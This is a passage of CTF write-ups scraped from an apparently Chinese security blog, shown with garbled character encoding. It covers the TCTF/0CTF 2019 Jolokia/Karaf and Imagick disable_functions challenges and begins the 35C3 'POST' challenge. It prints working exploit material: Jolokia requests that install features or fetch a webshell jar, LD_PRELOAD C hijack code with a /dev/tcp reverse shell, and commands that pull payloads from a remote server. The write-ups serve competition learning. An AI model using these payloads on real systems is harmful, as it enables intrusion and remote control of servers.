%}\né¢˜ç›®åœ°å€ï¼šhttp://101.71.29.5:10016\nç„¶è€Œé¢˜ç›®æ²¡å¼€\u0026hellip;\nWeb 6 æˆ‘çš„åšå®¢ Description {% colorquote info %} å¹´è½»ä¸æ‡‚äº‹ï¼Œæ²¡äº‹å†™åšå®¢ã€‚å†™å‡ºè¿™ä¹ˆä¸ªä¸œè¥¿ï¼Œè¿™å¯æ˜¯ä¸€æ•´ä¸ªåšå®¢å•Šã€‚(ç­”æ¡ˆä¸ºflag{}å½¢å¼ï¼Œæäº¤{}ä¸­å†…å®¹å³å¯) {% endcolorquote %}\né¢˜ç›®åœ°å€ï¼šhttp://101.71.29.5:10015\nç„¶è€Œé¢˜ç›®æ²¡å¼€\u0026hellip;\nConclusion æ˜å¤©å°±æ˜¯æ­£å¼æ¯”èµ›äº†ï¼Œåé¢è¿™å‡ ä¸ªæ²¡å¼€çš„é¢˜ç›®å¤§æ¦‚ä¹Ÿä¸ä¼šå¼€äº†ã€‚å‰å‡ ä¸ªè¿˜æ˜¯å­¦åˆ°äº†ä¸€ç‚¹ä¸œè¥¿ï¼Œä¸»è¦æ˜¯ web 3 å­¦ä¹ åˆ°äº†WITH ROLLUPçš„ç”¨æ³•ï¼Œè¿˜æ˜¯æœ‰ç‚¹æ”¶è·çš„ï¼Œå…¶ä»–å°±æ¯”è¾ƒæ°´äº†ã€‚\n","date":"2019-04-06T00:21:26Z","permalink":"https://blog.zeddyu.info/2019/04/06/%E5%AE%89%E6%81%92%E5%91%A8%E5%91%A8%E7%BB%83%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E7%89%B9%E5%88%AB%E7%89%88/","title":"2019å®‰æ’å‘¨å‘¨ç»ƒè¥¿æ¹–è®ºå‰‘ç‰¹åˆ«ç‰ˆ"},{"content":"ä¸Šå‘¨æœ«æŠ½ç©ºä½›ç³»æ‰“äº†ä¸€ä¸‹ TCTF/0CTF ï¼Œè·Ÿé©¬å¸ˆå‚…ä¸€èµ·åšäº† web1 ï¼Œweb 2 æ²¡æ¥å¾—åŠçœ‹å°±å…³é—­äº†ã€‚è¿™é‡Œå°±è®°å½•ä¸€ä¸‹ã€‚\nWeb1 Ghost Pepper Description  â€‹\tDo you know ghost pepper? Let\u0026rsquo;s eat. http://111.186.63.207:31337\n Hacking ç”±äºç¯å¢ƒå…³æ‰äº†ï¼Œè¿™é‡Œå°±ä¸æ”¾å›¾äº†ã€‚è¯´ä¸€ä¸‹å‡ ä¸ªè§£æ³•ã€‚\né¦–å…ˆé€šè¿‡å¼±å£ä»¤ karaf/karaf è¿›è¡Œè®¤è¯ï¼Œè¿›å…¥å‘ç°æ˜¯ jetty çš„ä¸­é—´ä»¶ï¼Œç„¶åæ€è·¯ä¸€ç›´èµ°ååœ¨è¿™ä¸ªä¸­é—´ä»¶ä¸Šï¼Œç›´åˆ°æœ‰å¸ˆå‚…è·Ÿæˆ‘è¯´ ghost pepper æŒ‡çš„æ˜¯ Jolokiaâ€¦nb\u0026hellip;\n \nç„¶ååˆå‚è€ƒäº†å‡ ç¯‡è…¾è®¯äº‘é¼çš„ç›¸å…³æ–‡ç« ï¼š\nExploiting Jolokia Agent with Java EE Servers\nå°è¯•äº† JNDI æ³¨å…¥ï¼Œå‘ç° proxymode æ²¡å¼€ï¼Œæ‰€ä»¥å¾—å¦æƒ³æ³•å­ï¼Œåœ¨/jolokia/list æˆ‘ä»¬å‘ç°äº†ä¸€äº›åº“ï¼Œæœ€ç»ˆç›®æ ‡èšé›†åˆ°äº† karaf ä¸Šã€‚\nç¬¬ä¸€ç§è§£æ³•æ˜¯é€šè¿‡æ¿€æ´» webconsole è¿™ä¸ª karaf çš„ feature ï¼Œè¿›å…¥ webconsole ï¼Œè¿™æ˜¯ä¸€ä¸ªç±»ä¼¼ Tomcat Manager åå°çš„ä¸€ä¸ªä¸œè¥¿ï¼Œè¿›å…¥ä¹‹åå¯ä»¥ä¸Šä¼  bundle ï¼Œå¹¶ä¸”å‹¾é€‰è‡ªåŠ¨ refresh bundle ï¼Œå°±ç›¸å½“äºä¸Šä¼ äº†ä¸€ä¸ª webshell ä¸€æ ·ï¼Œç›´æ¥è¿å°±å¥½äº†ï¼Œå…³äº bunlde çš„æ„å»ºç•™åˆ°ä¸‹é¢è®²å§ã€‚è¿˜æœ‰å°±æ˜¯è¿›å» Main/gogo çš„é€‰é¡¹ï¼Œå°±å¯ä»¥æ‹¿åˆ° karaf å†…ç½®çš„ä¸€ä¸ª shell ï¼Œå…·ä½“å‘½ä»¤å¯ä»¥å‚è€ƒ Shell console basicsï¼Œé€šè¿‡shell:cat /flag\næ¿€æ´» webconsole çš„ payload å¦‚ä¸‹\nPOST /jolokia HTTP/1.1 Host: 111.186.63.207:31337 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Content-Type: application/json Content-Length: 146 Authorization: Basic a2FyYWY6a2FyYWY= Connection: close Upgrade-Insecure-Requests: 1 { \u0026#34;type\u0026#34;:\u0026#34;EXEC\u0026#34;, \u0026#34;mbean\u0026#34;:\u0026#34;org.apache.karaf:name=root,type=feature\u0026#34;, \u0026#34;operation\u0026#34;: \u0026#34;installFeature(java.lang.String)\u0026#34;, \u0026#34;arguments\u0026#34;:[\u0026#34;webconsole\u0026#34;] } è¿˜æœ‰å…¶ä»–çš„å°±æ˜¯é€šè¿‡å¥½å‡ ä¸ª/listä¸­çš„installæ–¹æ³•æ¥å®ç°ã€‚æ¯”å¦‚karaf.configæˆ–è€…karaf.bundleçš„æ–¹æ³•éƒ½å¯ä»¥ï¼Œå…·ä½“æ–¹æ³•çš„å®ç°ç›´æ¥å»ä¸‹ä¸€ä¸ª karaf æºç æ¥çœ‹çœ‹å°±çŸ¥é“äº†ã€‚\n{ \u0026quot;type\u0026quot;:\u0026quot;EXEC\u0026quot; \u0026quot;mbean\u0026quot;:\u0026quot;org.apache.karaf:name=root,type=config\u0026quot;, \u0026quot;operation\u0026quot;:\u0026quot;install\u0026quot;, \u0026quot;arguments\u0026quot;:[\u0026quot;http://ip:port/webshell.jar\u0026quot;,\u0026quot;../../../../../opt/opendaylight-0.9.2/deploy/webshell.jar\u0026quot;,false] } è¿™é‡Œkaraf.configæ˜¯ä¸ª 0dayâ€¦å¯ä»¥å†™ä»»æ„æ–‡ä»¶\nè¿™é‡Œåˆ©ç”¨çš„éš¾ç‚¹å°±æ˜¯å¦‚ä½•æ„é€ ä¸€ä¸ª bundle æ–‡ä»¶äº†\u0026hellip;ä»æ¥éƒ½ä¸çŸ¥é“è¿˜æœ‰è¿™ç§æ–‡ä»¶â€¦è€Œä¸”æ˜¯ä¸ª.jaræ–‡ä»¶ï¼Œè€Œä¸”è¿™ä¸ªä¸œè¥¿çš„è§¦å‘ç‚¹åœ¨startå‡½æ•°ï¼Œémainå‡½æ•°\u0026hellip;å¯ä»¥æŒ‰ç…§é©¬å¸ˆå‚…çš„è¿™ä¸ªä»“åº“æ¥æ„å»ºï¼šosgi-bundle-backdoor\nWeb2 Wallbreaker Easy Description  â€‹\thttp://111.186.63.208:31340\n æ‰“å¼€åœ°å€å¯ä»¥å‘ç°æœ‰æ›´å¤šçš„æè¿°\n â€‹\tImagick is a awesome library for hackers to break disable_functions.\nSo I installed php-imagick in the server, opened a backdoor for you. Let\u0026rsquo;s try to execute /readflag to get the flag. Open basedir: /var/www/html:/tmp/7833d7f27adcba46bdfd6c9c31c89904 Hint: eval($_POST[\u0026ldquo;backdoor\u0026rdquo;]);\n  \nThe first way to Hack ä¸€çœ‹é¢˜ç›®æ„å›¾ä¹Ÿæ¯”è¾ƒæ˜æ˜¾ï¼Œéœ€è¦æˆ‘ä»¬åˆ©ç”¨Imagickè¿™ä¸ªæ¨¡å—å»è¿›è¡Œ rce\næˆ‘ä»¬å…ˆç›´æ¥çœ‹çœ‹phpinfo()ï¼Œå‘ç°æœç„¶æ˜¯èƒ½æ‰§è¡Œå‘½ä»¤çš„åŸºæœ¬éƒ½è¢« disable æ‰äº†\n \næˆ‘ä»¬è¿˜å¯ä»¥è°ƒç”¨readfile()æ¥æŸ¥çœ‹é¢˜ç›®æºä»£ç \n\u0026lt;?php $dir = \u0026#34;/tmp/\u0026#34; . md5(\u0026#34;$_SERVER[REMOTE_ADDR]\u0026#34;); mkdir($dir); ini_set(\u0026#39;open_basedir\u0026#39;, \u0026#39;/var/www/html:\u0026#39; . $dir); ?\u0026gt;\u0026lt;!DOCTYPE html\u0026gt;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;style\u0026gt;.pre {word-break: break-all;max-width: 500px;white-space: pre-wrap;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;pre class=\u0026#34;pre\u0026#34;\u0026gt;\u0026lt;code\u0026gt;Imagick is a awesome library for hackers to break `disable_functions`. So I installed php-imagick in the server, opened a `backdoor` for you. Let\u0026#39;s try to execute `/readflag` to get the flag. Open basedir: \u0026lt;?php echo ini_get(\u0026#39;open_basedir\u0026#39;);?\u0026gt; \u0026lt;?php eval($_POST[\u0026#34;backdoor\u0026#34;]);?\u0026gt; Hint: eval($_POST[\u0026#34;backdoor\u0026#34;]); \u0026lt;/code\u0026gt;\u0026lt;/pre\u0026gt;\u0026lt;/body\u0026gt; Hint: eval($_POST[\u0026#34;backdoor\u0026#34;]); \u0026lt;/code\u0026gt;\u0026lt;/pre\u0026gt;\u0026lt;/body\u0026gt; é¦–å…ˆæˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹é¢˜ç›®æ¶‰åŠçš„å‡ ä¸ªå‡½æ•°\nopen_basedir {% colorquote info %}\nopen_basedir å°† php æ‰€èƒ½æ‰“å¼€çš„æ–‡ä»¶é™åˆ¶åœ¨æŒ‡å®šçš„ç›®å½•æ ‘ä¸­ï¼ŒåŒ…æ‹¬æ–‡ä»¶æœ¬èº«ã€‚å½“ç¨‹åºè¦ä½¿ç”¨ä¾‹å¦‚fopen()æˆ–file_get_contents()æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œè¿™ä¸ªæ–‡ä»¶çš„ä½ç½®å°†ä¼šè¢«æ£€æŸ¥ã€‚å½“æ–‡ä»¶åœ¨æŒ‡å®šçš„ç›®å½•æ ‘ä¹‹å¤–ï¼Œç¨‹åºå°†æ‹’ç»æ‰“å¼€ã€‚\n{% endcolorquote %}\nä¾‹å¦‚å°±åƒè¿™æ ·ï¼Œè®¾ç½®äº†ini_set('open_basedir','/var/www/html');ä¹‹åï¼Œæˆ‘ä»¬åªèƒ½åœ¨/var/www/htmlè¿›è¡Œæ“ä½œï¼Œå³open_basediræ˜¯ç”¨æ¥é™åˆ¶è®¿é—®ç›®å½•çš„\n \nBypass Open_Basedir è¯¦ç»†å¯å‚è€ƒHow to bypass disable_functions and open_basedirï¼Œæ–‡ç« ä¸­å°±æåˆ°å¯ä»¥ä½¿ç”¨LD_PRELOADå’Œputenv()å‡½æ•°è¿›è¡Œç»•è¿‡\nLD_PRELOAD æˆ‘ä»¬é¦–å…ˆæ¥çœ‹çœ‹ä»€ä¹ˆæ˜¯LD_PRELOAD\n{% colorquote info %}\nLD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.\n{% endcolorquote %}\nç®€å•æ¥è¯´ï¼ŒLD_PRELOADè¿™ä¸ªç¯å¢ƒå˜é‡æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶ï¼Œä¼šåœ¨å…¶ä»–æ–‡ä»¶è¢«è°ƒç”¨å‰ï¼Œæœ€å…ˆè¢«è°ƒç”¨ã€‚\n{% colorquote info %}\nputenv ( string $setting ) : bool\næ·»åŠ  setting åˆ°æœåŠ¡å™¨ç¯å¢ƒå˜é‡ã€‚ ç¯å¢ƒå˜é‡ä»…å­˜æ´»äºå½“å‰è¯·æ±‚æœŸé—´ã€‚ åœ¨è¯·æ±‚ç»“æŸæ—¶ç¯å¢ƒä¼šæ¢å¤åˆ°åˆå§‹çŠ¶æ€ã€‚\n{% endcolorquote %}\nè€Œputenv()å¯ä»¥è®¾ç½®ç¯å¢ƒæ¢å˜é‡ï¼Œæ·»åŠ æˆ‘ä»¬å®šä¹‰çš„å˜é‡åˆ°æœåŠ¡å™¨ç¯å¢ƒå˜é‡ã€‚\né‚£ä¹ˆæˆ‘ä»¬å¤§æ¦‚å¯ä»¥æœ‰ä¸€ä¸ªæ€è·¯ï¼Œåˆ¶ä½œä¸€ä¸ªæ¶æ„çš„.soæ–‡ä»¶ï¼Œä½¿ç”¨putenv()è®¾ç½®LD_PRELOADä¸ºæ¶æ„æ–‡ä»¶è·¯å¾„ï¼Œç„¶åä½¿ç”¨æŸä¸ªphpå‡½æ•°ï¼Œè§¦å‘è¿™ä¸ª.soæ–‡ä»¶ï¼Œæ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„ä»£ç ã€‚\nå…·ä½“çš„æ”»å‡»é“¾å¯ä»¥å‚è€ƒï¼šLD_PRELOADçš„å·æ¢æ¢æŸ±ä¹‹èƒ½\nåŠ«æŒæ”»å‡» å‚è€ƒçš„ç»•è¿‡æ–‡ç« ä½¿ç”¨äº†mail()å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹\n \nè¿™é‡Œç¡®å®å¼€å¯äº†å­è¿›ç¨‹ï¼Œé‚£æˆ‘ä»¬å†è¯•è¯•å¼•å…¥putenv()çš„æ•ˆæœï¼Œé…åˆåŠ¨æ€é“¾æ¥åº“å°è¯•åŠ«æŒï¼Œä»£ç æ¥è‡ªChankro\nå…¶ä¸­__attribute__ ((__constructor__))æœ‰å¦‚ä¸‹è¯´æ˜\n1.It's run when a shared library is loaded, typically during program startup. 2.That's how all GCC attributes are; presumably to distinguish them from function calls. 3.The destructor is run when the shared library is unloaded, typically at program exit. æ‰€ä»¥å½“æˆ‘ä»¬ä½¿ç”¨ä¸Šæˆ‘ä»¬çš„åŠ¨æ€é“¾æ¥åº“åï¼Œå°±ä¼šè§¦å‘__attribute__ ((__constructor__))ï¼Œä»è€Œè¾¾æˆæˆ‘ä»¬rceçš„ç›®çš„ã€‚\n#define _GNU_SOURCE #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;string.h\u0026gt;#include \u0026lt;sys/types.h\u0026gt;#include \u0026lt;sys/stat.h\u0026gt;#include \u0026lt;signal.h\u0026gt;#include \u0026lt;unistd.h\u0026gt; void pwn(void) { system(\u0026#34;ls\u0026#34;); system(\u0026#34;echo hacked\u0026#34;); } void daemonize(void) { signal(SIGHUP, SIG_IGN); if (fork() != 0) { exit(EXIT_SUCCESS); } } __attribute__ ((__constructor__)) void preloadme(void) { unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); daemonize(); pwn(); } ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤äº§ç”ŸåŠ¨æ€é“¾æ¥åº“\ngcc hack.c -fPIC -shared -o hack.so php æ–‡ä»¶ä¸­ä»£ç ä¸º\n\u0026lt;?php putenv(\u0026#34;LD_PRELOAD=./hack.so\u0026#34;); mail(\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;\u0026#39;); ?\u0026gt; \nå¯ä»¥çœ‹åˆ°å·²ç»æ‰§è¡Œäº†lså‘½ä»¤å¹¶æˆåŠŸè¾“å‡ºäº†hackedï¼Œä½¿ç”¨straceçœ‹çœ‹æˆ‘ä»¬å¯ä»¥å‘ç°æ‰§è¡Œé¡ºåºã€‚\n \nå½“ç„¶è¿˜æœ‰å¦ä¸€ç§åŠ«æŒï¼Œç›´æ¥é€‰æ‹©ä¸€ä¸ªå‡½æ•°è¿›è¡ŒåŠ«æŒï¼Œä¾‹å¦‚æˆ‘ä»¬é€šè¿‡strace php test.phpå‘ç°è°ƒç”¨äº†geteuid()ä»¥åŠgetpid()å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨hack.cä¸­è¿™ä¹ˆå†™\n#define _GNU_SOURCE #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;string.h\u0026gt;#include \u0026lt;sys/types.h\u0026gt;#include \u0026lt;sys/stat.h\u0026gt;#include \u0026lt;signal.h\u0026gt; void pwn(void) { system(\u0026#34;ls\u0026#34;); system(\u0026#34;echo hacked!\u0026#34;); } void getpid(){ unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); pwn(); } è¿™æ ·ä¹Ÿå¯ä»¥å®ŒæˆåŠ«æŒ\n \nGetFlag æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥å¯åŠ¨å­è¿›ç¨‹çš„å‡½æ•°ï¼Œä»¥å®ç°æˆ‘ä»¬åŠ«æŒå‡½æ•°åšåˆ° RCE çš„ç›®çš„ï¼Œç„¶åè¿™é‡Œæˆ‘æœ¬åœ°è°ƒé€šäº†ä½†æ˜¯è¿œç¨‹ä¸çŸ¥é“æ€ä¹ˆæ²¡æ‰“é€š\u0026hellip;\n \nè¿™é‡Œæˆ‘ç›´æ¥ç”¨newäº†ä¸€ä¸ª.jpgä¹Ÿå¯ä»¥è°ƒç”¨å­è¿›ç¨‹ï¼Œä½†æ˜¯æœåŠ¡å™¨å´æ²¡æœ‰è§¦å‘\u0026hellip;\nç„¶åæœ€å¥½è¿˜æ˜¯æŒ‰ç…§é£˜é›¶å¸ˆå‚…çš„æ·±å…¥æµ…å‡ºLD_PRELOAD \u0026amp; putenv()ç”¨wmvè¿›è¡Œäº† hook ï¼Œæœ€åæˆåŠŸ RCEã€‚\nè¿™é‡Œçš„åŸç†å°±æ˜¯å› ä¸ºImagickåœ¨å¤„ç†wmvæ ¼å¼çš„æ–‡ä»¶ä¼šèµ·ä¸€ä¸ªå­è¿›ç¨‹æ¥å¤„ç†ï¼Œæ‰€ä»¥å°±è¾¾åˆ°äº†æˆ‘ä»¬çš„ç›®çš„ã€‚è¿˜æœ‰å¾ˆå¤šæ ¼å¼çš„æ–‡ä»¶éƒ½å¯ä»¥ï¼Œå¯ä»¥å‚è€ƒ ctftime ä¸Šè¯¥é¢˜çš„å…¶ä»– wpã€‚\n#define _GNU_SOURCE #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;string.h\u0026gt;#include \u0026lt;sys/types.h\u0026gt;#include \u0026lt;sys/stat.h\u0026gt;#include \u0026lt;signal.h\u0026gt;#include \u0026lt;unistd.h\u0026gt; void pwn(void) { system(\u0026#34;bash -c \\\u0026#34;sh \u0026gt;\u0026amp; /dev/tcp/your_ip/port 0\u0026gt;\u0026amp;1\\\u0026#34;\u0026#34;); } void daemonize(void) { signal(SIGHUP, SIG_IGN); if (fork() != 0) { exit(EXIT_SUCCESS); } } __attribute__ ((__constructor__)) void preloadme(void) { unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); daemonize(); pwn(); } è‡³äºæ€ä¹ˆä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨ä¸Šï¼Œæœ‰å¾ˆå¤šç§æ–¹æ³•ï¼Œæ¯”å¦‚file_put_contents()ï¼Œä¹Ÿå¯ä»¥ç”¨å¦‚ä¸‹çš„æ–¹å¼\ncopy(\u0026#34;http://106.14.153.173:8080/hack.wmv\u0026#34;, \u0026#34;/tmp/3b1412753f475cc969c37231dd6eaea2/hack.wmv\u0026#34;); copy(\u0026#34;http://106.14.153.173:8080/hack.so\u0026#34;, \u0026#34;/tmp/3b1412753f475cc969c37231dd6eaea2/hack.so\u0026#34;); The other way ä¹Ÿå¯ä»¥åˆ©ç”¨error_logè¿™ä¸ªæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ä¹Ÿå¼€å¯äº†å­è¿›ç¨‹è°ƒç”¨äº†sendmailæ–¹æ³•ã€‚æŒ‰ç…§ä¹‹å‰çš„æ€è·¯è¿›è¡Œå°±å¯ä»¥äº†\n \nå‚è€ƒ æ— éœ€sendmailï¼šå·§ç”¨LD_PRELOADçªç ´disable_functions\nThe second way to Hack è¿™é‡Œä¹Ÿä¸»è¦æ˜¯ç”¨äº†\n\u0026lt;delegate decode=\u0026#34;bpg\u0026#34; command=\u0026#34;\u0026amp;quot;@BPGDecodeDelegate@\u0026amp;quot; -b 16 -o \u0026amp;quot;%o.png\u0026amp;quot; \u0026amp;quot;%i\u0026amp;quot;; @MVDelegate@ \u0026amp;quot;%o.png\u0026amp;quot; \u0026amp;quot;%o\u0026amp;quot;\u0026#34;/\u0026gt; //\u0026#34;@BPGDecodeDelegate@\u0026#34; -b 16 -o \u0026#34;%o.png\u0026#34; \u0026#34;%i\u0026#34;; @MVDelegate@ \u0026#34;%o.png\u0026#34; \u0026#34;%o\u0026#34; è¿™é‡Œå‚è€ƒäº†å…¶ä»–å¸ˆå‚…çš„ wp ï¼Œä¸»è¦æ˜¯åˆ©ç”¨äº†@BPGDecodeDelegateå¯¹äºåç¼€.bpgçš„è§£æï¼Œå®ƒä¼šå» PATH ä¸­å¯»æ‰¾ç›¸å…³çš„bpgencæ–‡ä»¶\n \næ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è®¾ç½®ä¸€ä¸ªæ¶æ„çš„ PATH ï¼Œå¹¶åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹æ”¾å…¥æˆ‘ä»¬çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚\nåªè¦æ‰¾åˆ°å‡½æ•°è¦æ‰§è¡Œçš„æ–‡ä»¶æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œæ“ä½œäº†ã€‚ä¾‹å¦‚ä¸‹é¢ç”¨äº†Imagick-\u0026gt;readImage()çš„æ–¹æ³•\n \nConclusion è¿™æ¬¡æ¯”èµ›è¿˜æ˜¯ç©çš„æ¯”è¾ƒæœ‰æ”¶è·çš„ï¼Œè‡³å°‘ç»™æˆ‘æ‰“å‘äº†å‘¨æœ«ç­‰é¢è¯•ç»“æœçš„ç…ç†¬æ—¶å…‰2333â€¦ç¬¬ä¸€é¢˜è‡ªå·±æƒ³æ³•æ˜¯é€šè¿‡ karaf.shell å»åšï¼Œç„¶è€Œå¹¶æ²¡æœ‰æ‰¾åˆ°çªç ´ç‚¹ï¼Œè¿˜æ˜¯è·Ÿå¦ä¸€ä¸ªå¸ˆå‚…å¼„äº† karaf.config çš„ install æ–¹æ³•å»åšçš„ã€‚èœè¿˜æ˜¯èœï¼Œå¹¶æ²¡æœ‰å»å‘æ˜æ–‡æ¡£æ·±å…¥çš„ç‚¹ã€‚ç¬¬äºŒé¢˜åœ¨æ¯”èµ›ä¸­å› ä¸ºæ²¡ä»€ä¹ˆæ—¶é—´äº†ï¼Œå°±æ²¡æ€ä¹ˆå»çœ‹äº†ã€‚èµ›åå¤ç°è§‰å¾—è‡ªå·±å¯¹ php åº•å±‚äº†è§£çš„å¾ˆå°‘ï¼Œæ‰“ç®—è¿™æ®µæ—¶é—´å¯ä»¥å»å¾€è¿™æ–¹é¢å‘æ˜ä¸€ä¸‹ã€‚ä¹Ÿè¿˜æœ‰å…³äºç¬¬äºŒé¢˜è§£æ³•äºŒçš„å‘æ˜ç‚¹è¿˜å­˜åœ¨ä¸€å®šçš„ç–‘æƒ‘ï¼Œå¯èƒ½å°±æ˜¯ä» fuzz bpg æ ¼å¼å¼€å§‹å¯»æ‰¾åˆ°çš„çªç ´ç‚¹å§ã€‚è¿˜çœ‹åˆ°äº†å¦ä¸€ä¸ªå…³äºé¢˜äºŒçš„è§£æ³•ï¼Œç­‰ä¼šè¿˜å¯ä»¥ç ”ç©¶ä¸‹ä¸€ä¸‹ã€‚\n","date":"2019-04-03T00:09:58Z","permalink":"https://blog.zeddyu.info/2019/04/03/TCTF-0CTF-Web-%E8%AE%B0%E5%BD%95/","title":"TCTF/0CTF-Web è®°å½•"},{"content":"ä¹‹å‰çœ‹åˆ°äº† 35c3 çš„æ¯”èµ›ï¼Œä½†æ˜¯æ²¡æ—¶é—´æ‰“ï¼Œçœ‹äº†çœ‹é¢˜ï¼Œå‘ç°è¿™ä¸ªé¢˜è¿˜æ˜¯ä¸é”™çš„ï¼Œå•ç‹¬æ‹¿å‡ºæ¥å­¦ä¹ ä¸€ä¸‹\n[TOC]\nPOST Description  â€‹\tGo make some posts.\nHint: flag is in db\nHint2: the lovely XSS is part of the beautiful design and insignificant for the challenge\nHint3: You probably want to get the source code, luckily for you it\u0026rsquo;s rather hard to configure nginx correctly.\n Attacking Steps è¿™é‡Œç®€è¿°ä¸€ä¸‹æ”»å‡»é“¾\n nginx misconfiguration arbitrary unserialize SoapClient SSRF SoapClient CRLF injection miniProxy URL scheme bypass Connect to MSSQL via gopher Get flag  Hacking Nginx Misconfiguration æ ¹æ® hint2 ï¼Œæˆ‘ä»¬æ‰«ç›®å½•çš„æ—¶å€™å¯ä»¥å‘ç°\n[00:42:47] Starting: [00:42:47] 400 - 182B - /%2e%2e/google.com [00:42:52] 301 - 194B - /inc -\u0026gt; http://localhost/inc/ [00:42:52] 403 - 580B - /inc/config.inc [00:42:52] 403 - 580B - /inc/ [00:42:52] 403 - 580B - /inc/fckeditor [00:42:52] 403 - 580B - /inc/fckeditor/ [00:42:52] 403 - 580B - /inc/tiny_mce [00:42:52] 403 - 580B - /inc/tiny_mce/ [00:42:52] 403 - 580B - /inc/tinymce/ [00:42:52] 403 - 580B - /inc/tinymce [00:42:52] 302 - 0B - /index.php -\u0026gt; /?page=login [00:42:56] 403 - 580B - /uploads [00:42:56] 403 - 580B - /uploads/ Task Completed uploads å¤„å‘ç°äº†ä¸¤å¤„ 403 çš„åœ°æ–¹ï¼Œè€Œä¸”æœåŠ¡å™¨æ˜¯ Nginxï¼Œè€Œä¸”æ‹¿å…¶ä»–ä¸€äº›æ‰«æå™¨ä¹ŸæŠ¥äº†ç›®å½•åˆ—ä¸¾çš„æ´\nå¯ä»¥å‚è€ƒNginxä¸å®‰å…¨é…ç½®å¯èƒ½å¯¼è‡´çš„å®‰å…¨æ¼æ´ä¸ä¸‰ä¸ªæ¡ˆä¾‹çœ‹Nginxé…ç½®å®‰å…¨\n \nä¸‹è½½å¾—åˆ°æºç \nArbitrary Unserialize I æˆ‘ä»¬å¯ä»¥å¾ˆæ˜æ˜¾åœ°åœ¨ db.php ä¸­å‘ç°ååºåˆ—åŒ–çš„å½±å­\nprivate static function prepare_params($params) { return array_map(function($x){ if (is_object($x) or is_array($x)) { return \u0026#39;$serializedobject$\u0026#39; . serialize($x); } if (preg_match(\u0026#39;/^\\$serializedobject\\$/i\u0026#39;, $x)) { die(\u0026#34;invalid data\u0026#34;); return \u0026#34;\u0026#34;; } return $x; }, $params); } private static function retrieve_values($res) { $result = array(); while ($row = sqlsrv_fetch_array($res)) { $result[] = array_map(function($x){ return preg_match(\u0026#39;/^\\$serializedobject\\$/i\u0026#39;, $x) ? unserialize(substr($x, 18)) : $x; }, $row); } return $result; } è¿™é‡Œè¿˜æ˜¯æ¯”è¾ƒæ˜æ˜¾çš„ï¼Œä½†æ˜¯è¦æ€ä¹ˆæ„é€ è¿™ä¸ª POP é“¾å‘¢ï¼Œæˆ‘çœ‹äº†ä¸€ä¸‹ä¸æ˜¯ç‰¹åˆ«æ˜æ˜¾ï¼Œä¹Ÿæ˜¯æ¶‰åŠåˆ°äº† soapclient çš„æ„é€ ä¸åˆ©ç”¨ã€‚è€Œä¸”æ•´ä¸ªæ„é€ ä¹Ÿéœ€è¦æ¯”è¾ƒè€å¿ƒæ¥çœ‹ï¼Œå¦åˆ™ä¼šé™·å…¥å¤ç°éƒ½æ¯”è¾ƒæ‡µé€¼çš„æƒ…å†µã€‚\né¦–å…ˆæœ‰ååºåˆ—åŒ–çš„ç‚¹ï¼Œè‚¯å®šéœ€è¦æœ‰åˆ©ç”¨çš„ç±»ï¼Œå¦åˆ™å…‰æœ‰ååºåˆ—åŒ–çš„ç‚¹ï¼Œæ²¡æœ‰åˆ©ç”¨çš„ç±»ä¹Ÿæ²¡ä»€ä¹ˆç”¨ã€‚æ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦å»æ‰¾ä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„ç±»ã€‚\nByPass Mssql è™½ç„¶ç¡®å®šäº†æœ‰ååºåˆ—åŒ–æ¼æ´ï¼Œä½†æ˜¯è§¦å‘ååºåˆ—åŒ–çš„æ¡ä»¶å°±æ˜¯\npreg_match(\u0026#39;/^\\$serializedobject\\$/i\u0026#39;, $x) ? unserialize(substr($x, 18)) : $x; è™½ç„¶å‰é¢æ’å…¥æ•°æ®æœ‰ç»™æ•°æ®å¢åŠ $serializedobject$çš„åœ°æ–¹ï¼Œä½†æ˜¯è¿™é‡Œéœ€è¦æ•°ç»„æˆ–è€…å¯¹è±¡ï¼Œè€Œæˆ‘ä»¬ä¼ å…¥çš„åªèƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ä¸èƒ½åˆ©ç”¨è¿™ä¸ªç‚¹ã€‚\nè¿™é‡Œæ€ä¹ˆç»•è¿‡å¯¹/^\\$serializedobject\\$/içš„æ­£åˆ™åˆ¤æ–­å‘¢ï¼Ÿè¿™é‡Œå°±éœ€è¦ç”¨åˆ° Mssql çš„ä¸€ä¸ªç‰¹æ€§äº†ã€‚\n â€‹\tMSSQL converts full-width unicode characters to their ASCII representation. For example, if a string contains 0xEF 0xBC 0x84, it will be stored as $.\n 